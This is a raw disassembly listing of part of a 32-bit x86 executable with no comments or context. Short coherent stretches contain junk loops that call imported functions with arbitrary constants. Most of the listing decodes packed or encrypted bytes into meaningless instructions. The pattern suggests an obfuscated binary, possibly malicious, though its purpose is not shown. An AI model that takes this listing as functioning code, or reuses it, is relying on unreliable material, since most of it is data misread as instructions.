  40521d:	arpl   WORD PTR [ebx+0x91d69f8],bx
  405223:	inc    eax
  405224:	pop    eax
  405225:	mov    ecx,DWORD PTR [ebp-0x14da1f55]
  40522b:	aam    0x8b
  40522d:	shl    ebp,0xef
  405230:	fwait
  405231:	pusha  
  405232:	xor    eax,0xa277a0b
  405237:	inc    edi
  405238:	cwde   
  405239:	pop    edi
  40523a:	mov    edi,0xd5294360
  40523f:	in     eax,0xb3
  405241:	sbb    DWORD PTR [ebx+0x4c8702bf],ebp
  405247:	xchg   edx,eax
  405248:	mov    dl,0x9c
  40524a:	xor    cl,cl
  40524c:	mov    bl,dh
  40524e:	outs   dx,DWORD PTR ds:[esi]
  40524f:	push   es
  405250:	mov    edi,0x6387b906
  405255:	push   esp
  405256:	retf   
  405257:	dec    esp
  405258:	and    edi,ebp
  40525a:	mov    dl,0xd2
  40525c:	xor    al,0x3a
  40525e:	jg     0x405207
  405260:	sbb    al,0x6c
  405262:	nop
  405263:	xchg   esi,eax
  405264:	daa    
  405265:	int3   
  405266:	jecxz  0x405206
  405268:	bnd jb 0x40523c
  40526b:	adc    esi,ebp
  40526d:	outs   dx,BYTE PTR ds:[esi]
  40526e:	(bad)  
  40526f:	xchg   ebp,eax
  405270:	dec    ecx
  405271:	bnd jle 0x405208
  405274:	dec    ebp
  405275:	inc    esi
  405276:	mov    BYTE PTR [eax+eax*1+0x1b368be9],cl
  40527d:	shl    BYTE PTR [edi+0x22439142],1
  405283:	cmp    ch,BYTE PTR [ecx-0x37]
  405286:	sbb    DWORD PTR [ebp+0x684bfe5d],ebx
  40528c:	ins    DWORD PTR es:[edi],dx
  40528d:	repz fsub DWORD PTR [ebp+0x768d05f5]
  405294:	fnstenv [edx-0x20c252a8]
  40529a:	sub    BYTE PTR [ebx],bh
  40529c:	jmp    0x7bec:0x2f4bc1e5
  4052a3:	pop    es
  4052a4:	shl    DWORD PTR [ebx-0x742850f1],1
  4052aa:	jge    0x405294
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x430526,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x430526
  4052ff:	inc    eax
  405300:	mov    ds:0x430526,eax
  405305:	cmp    DWORD PTR ds:0x430526,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x430526,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eb28
  40533f:	cmp    DWORD PTR ds:0x430526,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x430526
  405351:	inc    eax
  405352:	mov    ds:0x430526,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x43055a
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x4305ea
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x430542
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x430532,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x430526
  40538a:	add    DWORD PTR ds:0x42e7f2,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x43053e,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x43053e
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x43053e,ecx
  4053ae:	cmp    DWORD PTR ds:0x43053e,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42ec20
  4053c9:	cmp    DWORD PTR ds:0x43053e,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ee94,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ee94
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ee94,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ee94,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42ea64
  405405:	cmp    DWORD PTR ds:0x42ee94,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ee94
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ee94,ecx
  40541f:	cmp    DWORD PTR ds:0x42ee94,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0xdd24d809
  405456:	sub    eax,0x7e7e24d2
  40545b:	mov    ebp,0xa87e7e71
  405460:	add    al,0x2a
  405462:	test   BYTE PTR [edx+ebx*1+0x2db1b050],ch
  405469:	int3   
  40546a:	add    esp,DWORD PTR [eax+ebp*1]
  40546d:	fidiv  WORD PTR [ebp+0x50]
  405470:	test   eax,0xfddbcfe9
  405475:	cmc    
  405476:	dec    ebx
  405477:	in     al,0x94
  405479:	push   esp
  40547a:	jb     0x4054b9
  40547c:	add    esi,DWORD PTR [esi-0x6b230de3]
  405482:	and    DWORD PTR [edi],edx
  405484:	or     DWORD PTR [ecx+0x21e9f2f4],ebx
  40548a:	dec    eax
  40548b:	mov    eax,ds:0x3651ba1b
  405490:	pop    ecx
  405491:	inc    ebp
  405492:	and    dl,BYTE PTR [ebx+0x62]
  405495:	add    eax,0x9f14c72e
  40549a:	(bad)  
  40549b:	jns    0x405425
  40549d:	xchg   edx,eax
  40549e:	or     eax,DWORD PTR [ecx+0x4]
  4054a1:	and    BYTE PTR [edi],dh
  4054a3:	or     eax,0xf82986e5
  4054a8:	add    DWORD PTR [ebp+0x793ae5f9],edi
  4054ae:	xchg   ecx,eax
  4054af:	jl     0x405473
  4054b1:	int3   
  4054b2:	jle    0x40543f
  4054b4:	cld    
  4054b5:	out    dx,al
  4054b6:	outs   dx,BYTE PTR ds:[esi]
  4054b7:	clc    
  4054b8:	inc    ebp
  4054b9:	arpl   WORD PTR [ebx-0x7],dx
  4054bc:	mov    edi,0x57d2a2ce
  4054c1:	retf   0x5dbd
  4054c4:	pop    DWORD PTR [esi+0x4482f65a]
  4054ca:	mov    fs,ebx
  4054cc:	and    al,BYTE PTR [ecx+0x537ae648]
  4054d2:	lods   eax,DWORD PTR ds:[esi]
  4054d3:	add    cl,BYTE PTR [edx]
  4054d5:	sub    DWORD PTR [eax+0x21],ebx
  4054d8:	mov    eax,0x5840b056
  4054dd:	daa    
  4054de:	mov    esi,0xc3223705
  4054e3:	add    ebx,edx
  4054e5:	adc    BYTE PTR [ebx+ebx*8-0x2f6ba22d],al
  4054ec:	jle    0x405471
  4054ee:	int    0x7a
  4054f0:	in     al,dx
  4054f1:	fild   QWORD PTR [edx+ebx*2]
  4054f4:	jmp    0x1cc4ef97
  4054f9:	push   esi
  4054fa:	out    0x44,al
  4054fc:	scas   al,BYTE PTR es:[edi]
  4054fd:	adc    BYTE PTR [esi-0x27],0xa7
  405501:	xor    BYTE PTR [edi+0x7],cl
  405504:	fwait
  405505:	mov    es,esi
  405507:	int    0xb2
  405509:	mov    ah,0x44
  40550b:	ds pop ebx
  40550d:	mov    ah,0xdc
  40550f:	jecxz  0x405570
  405511:	mov    ?,WORD PTR [edi+0x17f01c17]
  405517:	mov    BYTE PTR [edi+0x41a5575e],dh
  40551d:	cmp    BYTE PTR [edx],dl
  40551f:	cs enter 0x2db,0x49
  405524:	add    ebx,DWORD PTR [eax-0x2161a014]
  40552a:	mov    ebp,0x3bc2fc9d
  40552f:	jns    0x405575
  405531:	nop
  405532:	jo     0x405510
  405534:	pop    ebx
  405535:	dec    esi
  405536:	out    0x78,al
  405538:	lea    edi,[esp+edx*2]
  40553b:	push   0xffffffb8
  40553d:	lds    edx,FWORD PTR ss:[edx]
  405540:	popf   
  405541:	and    ebp,DWORD PTR [edx+0x188f2239]
  405547:	(bad)  
  405548:	clc    
  405549:	shr    DWORD PTR [ebp-0x71],cl
  40554c:	mov    esi,DWORD PTR [edx]
  40554e:	dec    ebx
  40554f:	ins    BYTE PTR es:[edi],dx
  405550:	xor    esi,DWORD PTR ds:0xa4d8351b
  405556:	mov    dl,0x3a
  405558:	mov    esp,0x38f76aac
  40555d:	stos   BYTE PTR es:[edi],al
  40555e:	popa   
  40555f:	scas   eax,DWORD PTR es:[edi]
  405560:	mov    ds:0xf1a11728,al
  405565:	adc    BYTE PTR ds:0xeebb432,ch
  40556b:	scas   al,BYTE PTR es:[edi]
  40556c:	cdq    
  40556d:	jle    0x405532
  40556f:	lahf   
  405570:	cli    
  405571:	(bad)  
  405572:	imul   ebx,esi,0x6d34ee7b
  405578:	rcr    DWORD PTR [edi+eiz*1],cl
  40557b:	jne    0x40550f
  40557d:	retf   
  40557e:	data16 cmp BYTE PTR [ebx+0x35],0x6a
  405583:	dec    ebx
  405584:	outs   dx,DWORD PTR ds:[esi]
  405585:	sub    edi,ecx
  405587:	adc    al,cl
  405589:	xchg   edx,eax
  40558a:	lods   al,BYTE PTR ds:[esi]
  40558b:	neg    BYTE PTR [ebx+eiz*1]
  40558e:	pop    ebp
  40558f:	lahf   
  405590:	outs   dx,DWORD PTR ds:[esi]
  405591:	fld    DWORD PTR [edi+0x3b7fc9b1]
  405597:	xchg   esi,eax
  405598:	jo     0x40555c
  40559a:	xchg   esi,eax
  40559b:	ins    BYTE PTR es:[edi],dx
  40559c:	test   eax,0xb3169b1f
  4055a1:	adc    DWORD PTR [ecx+0x4440a46a],ebx
  4055a7:	dec    edi
  4055a8:	mov    eax,0xd70fca6
  4055ad:	pushf  
  4055ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055af:	pop    ecx
  4055b0:	inc    ebx
  4055b1:	dec    ecx
  4055b2:	and    DWORD PTR ds:0xb4181fae,edi
  4055b8:	mov    ah,0x6c
  4055ba:	fld    DWORD PTR [ebx]
  4055bc:	repz jmp 0x40554e
  4055bf:	pushf  
  4055c0:	mov    BYTE PTR [edx+0x2f],cl
  4055c3:	(bad)  
  4055c4:	popf   
  4055c5:	mov    al,BYTE PTR [eax]
  4055c7:	mov    dh,0xf0
  4055c9:	(bad)  
  4055ca:	cmc    
  4055cb:	xchg   edi,eax
  4055cc:	pop    es
  4055cd:	lods   al,BYTE PTR ds:[esi]
  4055ce:	push   0x21
  4055d0:	or     edx,ebx
  4055d2:	push   esp
  4055d3:	mov    ecx,0x66f6273f
  4055d8:	dec    edi
  4055d9:	jmp    0x61b5eb38
  4055de:	fucomi st,st(1)
  4055e0:	test   esi,edx
  4055e2:	mov    dl,0x37
  4055e4:	pop    esp
  4055e5:	icebp  
  4055e6:	fdivp  st(3),st
  4055e8:	xchg   ecx,eax
  4055e9:	(bad)  
  4055ea:	cwde   
  4055eb:	(bad)  [esi+eax*1+0x4db85f60]
  4055f2:	inc    esi
  4055f3:	sub    DWORD PTR [ecx+0x3b],0xb9b226fb
  4055fa:	ret    0xf635
  4055fd:	lock jmp 0x4da9155d
  405603:	sti    
  405604:	(bad)  
  405605:	cli    
  405606:	xchg   edi,eax
  405607:	mov    al,0x9e
  405609:	dec    ebp
  40560a:	inc    ebx
  40560b:	sbb    edx,DWORD PTR [ecx]
  40560d:	mov    ah,0x45
  40560f:	push   esp
  405610:	daa    
  405611:	dec    esp
  405612:	aas    
  405613:	(bad)  
  405614:	rcr    BYTE PTR [ebp+0x12],0x51
  405618:	into   
  405619:	ds adc ah,cl
  40561c:	mov    al,BYTE PTR [edi-0x41]
  40561f:	mov    edx,0x46ea250f
  405624:	mov    ah,0xb9
  405626:	inc    ebx
  405627:	idiv   esi
  405629:	sbb    BYTE PTR [ecx+eiz*8-0x250cf634],0xd
  405631:	mov    eax,0xf8ff32d2
  405636:	dec    esp
  405637:	pop    edx
  405638:	stos   BYTE PTR es:[edi],al
  405639:	in     eax,dx
  40563a:	jle    0x40567b
  40563c:	outs   dx,BYTE PTR ds:[esi]
  40563d:	es popa 
  40563f:	pop    ecx
  405640:	sbb    ecx,DWORD PTR [edi+0x73]
  405643:	aas    
  405644:	scas   eax,DWORD PTR es:[edi]
  405645:	test   edi,ebx
  405647:	cwde   
  405648:	jle    0x405661
  40564a:	and    ebp,DWORD PTR [ecx]
  40564c:	push   ebx
  40564d:	jbe    0x40565b
  40564f:	cli    
  405650:	push   esp
  405651:	rcl    BYTE PTR [edx-0x70],0xef
  405655:	ins    DWORD PTR es:[edi],dx
  405656:	push   edx
  405657:	ror    BYTE PTR [esi-0x58],0x54
  40565b:	inc    ebx
  40565c:	fld    DWORD PTR [edx-0x3d]
  40565f:	push   ds
  405660:	shl    DWORD PTR [edx+0x587ff593],1
  405666:	xchg   ecx,eax
  405667:	daa    
  405668:	ds or  bh,ah
  40566b:	or     BYTE PTR [ebp+0x65],dh
  40566e:	lahf   
  40566f:	push   esp
  405670:	or     al,0xf9
  405672:	push   eax
  405673:	icebp  
  405674:	jmp    0x6a28:0x970380f1
  40567b:	mov    bl,0x3b
  40567d:	aaa    
  40567e:	jp     0x405687
  405680:	cmc    
  405681:	mov    edi,0x466fe111
  405686:	push   esp
  405687:	call   0x294c:0x1eb787f3
  40568e:	retf   
  40568f:	push   ss
  405690:	xor    bl,BYTE PTR [ebp-0x12f54c5b]
  405696:	inc    esp
  405697:	in     al,dx
  405698:	ret    0x5507
  40569b:	pop    edx
  40569c:	adc    BYTE PTR [edx+eiz*1+0x59],dl
  4056a0:	fsubrp st(7),st
  4056a2:	aad    0xfb
  4056a4:	jno    0x4056bb
  4056a6:	xchg   ebp,eax
  4056a7:	cwde   
  4056a8:	es pop ss
  4056aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ac:	int3   
  4056ad:	pop    esi
  4056ae:	pop    eax
  4056af:	add    al,0x23
  4056b1:	iret   
  4056b2:	idiv   eax
  4056b4:	pop    edx
  4056b5:	inc    ebx
  4056b6:	and    edi,ebx
  4056b8:	fcomp  DWORD PTR [ecx-0x7db8a389]
  4056be:	xchg   BYTE PTR gs:[edi-0x80],bh
  4056c2:	cwde   
  4056c3:	mov    ebp,0x20aac6e
  4056c8:	loopne 0x4056c1
  4056ca:	mov    ebp,0xd4af95ee
  4056cf:	ins    DWORD PTR es:[edi],dx
  4056d0:	leave  
  4056d1:	outs   dx,DWORD PTR ds:[esi]
  4056d2:	cmc    
  4056d3:	dec    edx
  4056d4:	fs mov edx,0xf385c8bf
  4056da:	adc    DWORD PTR [esp+esi*4],eax
  4056dd:	and    bl,BYTE PTR [ebx]
  4056df:	jae    0x405662
  4056e1:	out    dx,al
  4056e2:	fdiv   QWORD PTR [ebx+0x7a5326b1]
  4056e8:	cli    
  4056e9:	pop    ds
  4056ea:	imul   ecx,ebp,0xb2347bf3
  4056f0:	nop
  4056f1:	push   edi
  4056f2:	adc    dh,BYTE PTR [edi+0x17d2c8ac]
  4056f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f9:	imul   edx,DWORD PTR [eax+edx*1],0x66
  4056fd:	adc    edi,DWORD PTR [ecx]
  4056ff:	dec    ebp
  405700:	(bad)  [ecx+0x12]
  405703:	fmulp  st(6),st
  405705:	pop    ecx
  405706:	call   0xf7db:0x6283354d
  40570d:	adc    eax,0x3b2f57a7
  405712:	inc    ebx
  405713:	mov    eax,ds:0xad6ea6c
  405718:	(bad)  
  405719:	push   ss
  40571a:	sub    ebp,ecx
  40571c:	mov    ds:0x44b92491,eax
  405721:	sub    ah,ah
  405723:	add    dh,bl
  405725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405726:	xchg   ecx,eax
  405727:	das    
  405728:	mov    gs,WORD PTR [edi+0xba9c4d9]
  40572e:	add    BYTE PTR [ebp-0x1c],ch
  405731:	cmp    DWORD PTR [esp+ebp*2],edi
  405734:	mov    BYTE PTR [edi+ebx*4+0x77ed3283],dl
  40573b:	retf   
  40573c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40573d:	mov    ecx,0xd55a7406
  405742:	mov    dh,0xf8
  405744:	pop    edi
  405745:	jge    0x4056d1
  405747:	nop
  405748:	fnstcw WORD PTR [eax+0x13c24312]
  40574e:	repz mov al,0x30
  405751:	dec    ebp
  405752:	ror    DWORD PTR [esi+0x493f46ae],1
  405758:	push   eax
  405759:	retf   
  40575a:	(bad)  
  40575b:	xchg   ebp,eax
  40575c:	mov    ds,edi
  40575e:	push   edi
  40575f:	cli    
  405760:	xor    BYTE PTR [ebx+ebx*4],dl
  405763:	sti    
  405764:	xchg   edx,eax
  405765:	adc    BYTE PTR [ecx+0x33],bh
  405768:	jmp    0xae3b:0x83c73fad
  40576f:	or     al,0x64
  405771:	aaa    
  405772:	mov    ds,WORD PTR [ebx]
  405774:	imul   esi,DWORD PTR [esi-0x293196e8],0xffffffb6
  40577b:	mov    eax,ds:0x3b9be0c4
  405780:	(bad)  
  405781:	(bad)  
  405782:	hlt    
  405783:	jmp    0x40577e
  405785:	mov    al,0xbe
  405787:	gs xor eax,0x6d3e510a
  40578d:	mov    ds,esp
  40578f:	das    
  405790:	nop
  405791:	(bad)  [esi+0x56]
  405794:	push   edi
  405795:	fs xchg ecx,eax
  405797:	sar    BYTE PTR [edi+eax*2],1
  40579a:	in     al,dx
  40579b:	or     dh,dh
  40579d:	lds    ebp,FWORD PTR [esi+0x1196ffcc]
  4057a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057a4:	cdq    
  4057a5:	fcmovnu st,st(5)
  4057a7:	popa   
  4057a8:	cli    
  4057a9:	std    
  4057aa:	push   ebx
  4057ab:	out    dx,eax
  4057ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057ad:	sub    eax,0x194fd96d
  4057b2:	out    dx,al
  4057b3:	jae    0x405747
  4057b5:	stc    
  4057b6:	xchg   esp,eax
  4057b7:	jle    0x405747
  4057b9:	cmc    
  4057ba:	push   esi
  4057bb:	pop    ecx
  4057bc:	jae    0x4057ab
  4057be:	lds    edi,FWORD PTR [esi]
  4057c0:	cmp    BYTE PTR [edx-0x32a1af5],bl
  4057c6:	(bad)  
  4057c7:	pop    ecx
  4057c8:	adc    DWORD PTR [ebp+0x7d8eff8],ebx
  4057ce:	(bad)  [edx+0x6c]
  4057d1:	add    eax,0xfec3492a
  4057d6:	pop    ds
  4057d7:	call   FWORD PTR [ecx+edi*4-0x12]
  4057db:	xor    al,0xe1
  4057dd:	mov    ecx,0xb7be0bda
  4057e2:	mov    esi,0x9e445b12
  4057e7:	fcomp  DWORD PTR [esp+eax*4+0x73]
  4057eb:	and    BYTE PTR [ebx-0x19],dh
  4057ee:	call   0x9fc02129
  4057f3:	sub    BYTE PTR [eax+0x20],0x3f
  4057f7:	add    eax,0xd5f31816
  4057fc:	inc    ebp
  4057fd:	cmp    al,BYTE PTR [ecx-0x41769b7f]
  405803:	or     al,0xe6
  405805:	inc    eax
  405806:	or     al,0xc2
  405808:	cld    
  405809:	add    bh,bl
  40580b:	mov    bl,0x82
  40580d:	or     DWORD PTR [ebx-0x76],ebp
  405810:	cmp    BYTE PTR [esp+edi*2],0x1
  405814:	enter  0x1c8a,0x94
  405818:	(bad)  
  405819:	jmp    0x550d3fe0
  40581e:	cmp    edi,edx
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8-0x40ff8c4],bh
  405847:	lea    edx,[ecx]
  405849:	cmp    BYTE PTR [esi+0x7e],bh
  40584c:	mov    ebp,0xde7e7e71
  405851:	and    al,0x82
  405853:	lods   eax,DWORD PTR ds:[esi]
  405854:	ret    0x6606
  405857:	xor    eax,0x75b2634
  40585c:	fisubr DWORD PTR [ebp+0x2527af3f]
  405862:	sbb    DWORD PTR [eax-0x5e],0xffffffd0
  405866:	sbb    edi,esi
  405868:	ss test al,0xdc
  40586b:	lods   eax,DWORD PTR ds:[esi]
  40586c:	pop    ss
  40586d:	sbb    al,BYTE PTR [esi+0xb]
  405870:	jle    0x4058df
  405872:	daa    
  405873:	jbe    0x405867
  405875:	cli    
  405876:	inc    eax
  405877:	nop
  405878:	jne    0x4058c4
  40587a:	mov    bh,0xe9
  40587c:	stos   BYTE PTR es:[edi],al
  40587d:	rep lods al,BYTE PTR ds:[esi]
  40587f:	adc    DWORD PTR [edx+eax*4-0x5e],edi
  405883:	pop    es
  405884:	inc    esp
  405885:	jne    0x40582f
  405887:	fistp  DWORD PTR [edx]
  405889:	jns    0x40584e
  40588b:	call   0xa89e:0xa1b3b8a3
  405892:	shr    BYTE PTR [edx],cl
  405894:	cmp    eax,0xd47d307d
  405899:	call   0xefd1bfed
  40589e:	mov    esp,0xab0f5200
  4058a3:	jmp    0x40591e
  4058a5:	push   ebx
  4058a6:	ins    DWORD PTR es:[edi],dx
  4058a7:	mov    eax,0x7f6f0e1e
  4058ac:	les    esp,FWORD PTR [ebx-0x5b2921b1]
  4058b2:	adc    eax,0x1e10d906
  4058b7:	push   edx
  4058b8:	cs enter 0xf221,0xfb
  4058bd:	pop    eax
  4058be:	mov    eax,ss
  4058c0:	cdq    
  4058c1:	dec    esp
  4058c2:	jg     0x405940
  4058c4:	xor    DWORD PTR [edi-0x5d],eax
  4058c7:	loopne 0x4058c5
  4058c9:	ins    BYTE PTR es:[edi],dx
  4058ca:	bound  ebp,QWORD PTR [ebp+0x15]
  4058cd:	(bad)  
  4058ce:	(bad)  
  4058cf:	loopne 0x405852
  4058d1:	out    dx,eax
  4058d2:	in     eax,0xef
  4058d4:	jmp    0x4058ac
  4058d6:	div    BYTE PTR [edx+0x2e4e6187]
  4058dc:	or     eax,0x88f0661d
  4058e1:	popa   
  4058e2:	cmp    BYTE PTR [edi-0x59f38097],ah
  4058e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058e9:	pop    ecx
  4058ea:	bound  ebp,QWORD PTR [ecx+eax*2+0x13]
  4058ee:	jmp    0x6956:0x4024dd3c
  4058f5:	test   BYTE PTR [ebx+0x14f675ac],ch
  4058fb:	xchg   ecx,eax
  4058fc:	fmul   DWORD PTR [ebp+0x72]
  4058ff:	sbb    eax,0xfd4a098a
  405904:	jnp    0x405913
  405906:	mov    ah,0xba
  405908:	xchg   ecx,eax
  405909:	outs   dx,BYTE PTR ds:[esi]
  40590a:	fidivr DWORD PTR [esi+0xa9e337c]
  405910:	popa   
  405911:	mov    esi,0x7bf6a704
  405916:	adc    ebp,edx
  405918:	pop    esi
  405919:	jae    0x40598c
  40591b:	mov    cl,BYTE PTR [edi]
  40591d:	sti    
  40591e:	lods   al,BYTE PTR cs:[esi]
  405920:	jne    0x405948
  405922:	jp     0x40596d
  405924:	or     eax,0xf952d9f6
  405929:	xchg   BYTE PTR [ebx],cl
  40592b:	pop    esp
  40592c:	sbb    eax,0x6766675
  405931:	pop    ebx
  405932:	rcl    BYTE PTR [edi+edx*2-0x4f],0xba
  405937:	clc    
  405938:	stos   BYTE PTR es:[edi],al
  405939:	and    DWORD PTR [ecx-0x5854d8c1],esi
  40593f:	mov    ebp,0x66b43a85
  405944:	std    
  405945:	mov    ds:0x7532e24f,al
  40594a:	lea    edi,[ebp+0x5a]
  40594d:	mov    DWORD PTR [ebp-0x21],ecx
  405950:	xchg   edx,eax
  405951:	mov    ch,0xa0
  405953:	or     BYTE PTR [edx-0x38d1a78d],bh
  405959:	lods   al,BYTE PTR ds:[esi]
  40595a:	cli    
  40595b:	or     BYTE PTR [esi],dl
  40595d:	dec    eax
  40595e:	sbb    al,0xde
  405960:	mov    esp,es
  405962:	das    
  405963:	retf   0x211f
  405966:	push   ss
  405967:	cmp    BYTE PTR [edi-0x414aeffe],ah
  40596d:	cs int 0x3e
  405970:	xchg   DWORD PTR [edi+0x55],esi
  405973:	xchg   ebx,eax
  405974:	or     dh,BYTE PTR [esi-0x24]
  405977:	dec    esi
  405978:	or     BYTE PTR [ebx+0x2e1ed402],ah
  40597e:	mov    al,ds:0x64ec64bb
  405983:	mov    ecx,0x2508b2fa
  405988:	xor    DWORD PTR [ebx+edx*4-0x21],esp
  40598c:	push   cs
  40598d:	dec    eax
  40598e:	xchg   ebx,eax
  40598f:	jb     0x405951
  405991:	or     eax,0x8c4a83e
  405996:	stc    
  405997:	arpl   WORD PTR [eax+0xbbc3187],ax
  40599d:	fcmovnu st,st(4)
  40599f:	add    ecx,DWORD PTR [eax+ebp*8+0x5]
  4059a3:	loopne 0x405946
  4059a5:	jmp    0x405968
  4059a7:	icebp  
  4059a8:	push   esi
  4059a9:	call   0x90e35815
  4059ae:	mov    edi,0x81562b66
  4059b3:	(bad)  
  4059b4:	in     al,0xda
  4059b6:	popf   
  4059b7:	sahf   
  4059b8:	xchg   esp,eax
  4059b9:	xlat   BYTE PTR ds:[ebx]
  4059ba:	ins    DWORD PTR es:[edi],dx
  4059bb:	outs   dx,DWORD PTR ds:[esi]
  4059bc:	gs add edx,edx
  4059bf:	sbb    BYTE PTR [eax-0x50288bea],0xea
  4059c6:	ins    DWORD PTR es:[edi],dx
  4059c7:	pop    ss
  4059c8:	shl    DWORD PTR [ebx-0x77],0xa3
  4059cc:	jae    0x405a2a
  4059ce:	mov    ebp,0x4f768cf8
  4059d3:	mov    ebp,0xea2ef403
  4059d8:	sbb    eax,0x684dfb43
  4059dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059de:	pop    es
  4059df:	dec    edx
  4059e0:	call   0x8801:0xf62cf7a5
  4059e7:	outs   dx,DWORD PTR ds:[esi]
  4059e8:	scas   eax,DWORD PTR es:[edi]
  4059e9:	add    BYTE PTR [ebp-0x451e38a2],0x50
  4059f0:	pop    edi
  4059f1:	push   edx
  4059f2:	push   ebx
  4059f3:	fs aad 0x6a
  4059f6:	(bad)  
  4059f7:	aas    
  4059f8:	out    0x14,al
  4059fa:	sti    
  4059fb:	sbb    esi,eax
  4059fd:	jg     0x405a64
  4059ff:	xor    DWORD PTR [ecx],edi
  405a01:	xor    bh,cl
  405a03:	sti    
  405a04:	outs   dx,BYTE PTR ds:[esi]
  405a05:	mov    ecx,0x142ac22e
  405a0a:	lock in al,dx
  405a0c:	sbb    DWORD PTR [esi],edi
  405a0e:	outs   dx,DWORD PTR ds:[esi]
  405a0f:	cli    
  405a10:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  405a12:	neg    BYTE PTR [eax-0x32]
  405a15:	xor    BYTE PTR [ecx],al
  405a17:	and    ah,BYTE PTR [ebp-0x380d9a3e]
  405a1d:	das    
  405a1e:	call   DWORD PTR ss:[edx+0x5f56d496]
  405a25:	pop    esp
  405a26:	xchg   esp,eax
  405a27:	and    DWORD PTR [edi+0x6c],0xffffffb1
  405a2b:	and    cl,BYTE PTR [eax-0x61823207]
  405a31:	xor    edx,ebp
  405a33:	push   eax
  405a34:	lahf   
  405a35:	ss int3 
  405a37:	jnp    0x405a79
  405a39:	cdq    
  405a3a:	ins    BYTE PTR es:[edi],dx
  405a3b:	out    0xc0,eax
  405a3d:	xor    cl,0x23
  405a40:	mov    edx,?
  405a42:	mov    ss,WORD PTR [edx+0x71bc27dd]
  405a48:	(bad)  
  405a49:	lds    esp,FWORD PTR [edi+0x73]
  405a4c:	xlat   BYTE PTR ds:[ebx]
  405a4d:	adc    eax,0x68ec9e1d
  405a52:	sbb    bh,BYTE PTR [ecx+0x677165e4]
  405a58:	or     esp,esi
  405a5a:	arpl   WORD PTR [ebx],cx
  405a5c:	les    eax,FWORD PTR [esi+0x19]
  405a5f:	(bad)  
  405a60:	call   0xc0e65f64
  405a65:	mov    al,BYTE PTR [esi+eax*4-0x62]
  405a69:	cmp    dh,dh
  405a6b:	and    esi,DWORD PTR [ebp+esi*8-0x5e]
  405a6f:	add    eax,0xf14419d5
